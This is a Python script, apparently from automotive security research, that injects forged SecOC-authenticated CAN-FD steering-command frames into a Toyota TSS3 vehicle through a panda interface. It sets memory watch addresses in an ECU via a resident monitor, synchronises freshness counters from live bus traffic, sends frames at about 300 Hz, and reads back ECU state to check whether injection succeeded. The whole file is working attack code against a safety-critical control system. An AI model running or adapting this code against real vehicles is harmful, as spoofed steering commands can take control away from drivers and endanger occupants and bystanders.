import time
from exploit.ephemeral_runtime.camry_f33_runtime_monitor import MonitorSession,OP_SET_WATCH_BASE,OP_RUN,CONTROL_CAN_ID,CONTROL_CAN_BUS,command_frame,decode_secoc_sync,decode_steering_angle_deg
from opendbc.car.toyota.tss3 import *
s=MonitorSession(require_ready_parked=True)
addrs=[0xFFD23580,0xFFD2358C,0xFFD23600,0xFFD2360C,0xFFD23680,0xFFD2368C,0xFFD23610,0xFFD23604]
for i,a in enumerate(addrs): s._send(OP_SET_WATCH_BASE+i,a,lambda st,i=i,a=a: st['watch_addresses_raw'][i]==a)
# seed CAN latest without UDS after this point in each burst
for _ in range(50): s.panda.can_recv(); time.sleep(.002)
ang=s.panda.latest(0,0x025); assert ang
traw=target_angle_deg_to_raw(decode_steering_angle_deg(ang[1]))
tpl=TSS3B6Template(); comp=TSS3B6CompanionFields(signal264_b6_bits6_4=5,additive_term_suppress=0,contribution_pct_1=23,contribution_pct_2=47,signal273_b10_bits2_0=5)
for attempt in range(8):
    rr=s.set_running(True); seq_ctl=(rr['sequence']+1)&0xff
    # no UDS reads now
    seq=0; mc=0; cr=None; sent=0; deadline=time.monotonic(); stopat=time.monotonic()+0.12
    last=None
    while time.monotonic()<stopat:
        s.panda.can_recv(); row=s.panda.latest(0,0x00F)
        if row:
            sy=decode_secoc_sync(row[1]); r=int(sy['reset_counter'])
            if cr!=r: cr=r; mc=0
            app=build_b6_application(target_lateral_id=63,target_angle_raw=traw,sequence=seq,template=tpl,companions=comp)
            a,d,b=build_b6_secoc_frame(TSS3_B6_DUMMY_SECOC_KEY,app,TSS3Freshness(int(sy['trip_counter']),r,mc))
            s.panda.can_send(a,d,0,fd=True); last=d; sent+=1; seq=(seq+1)&63; mc=(mc+1)&255
        deadline+=1/300; time.sleep(max(0,deadline-time.monotonic()))
    # stop resident sampling via control CAN only; don't UDS-poll ACK
    frstop=command_frame(seq_ctl,OP_RUN,0)
    for _ in range(5):
        s.panda.can_send(CONTROL_CAN_ID,frstop,CONTROL_CAN_BUS); time.sleep(.03)
    time.sleep(.20)
    st=s.read_state(); vals=[v['raw_u32'] for v in st['values']]
    ids=[vals[0]&0x1fffffff,vals[2]&0x1fffffff,vals[4]&0x1fffffff]
    print('attempt',attempt,'sent',sent,'last',last[:8].hex() if last else None,'running',st['running'],'ids',[hex(x) for x in ids],'df0',[hex(vals[1]),hex(vals[3]),hex(vals[5])],'fifo1_df1',hex(vals[6]),'ptr1',hex(vals[7]))
    time.sleep(.08)
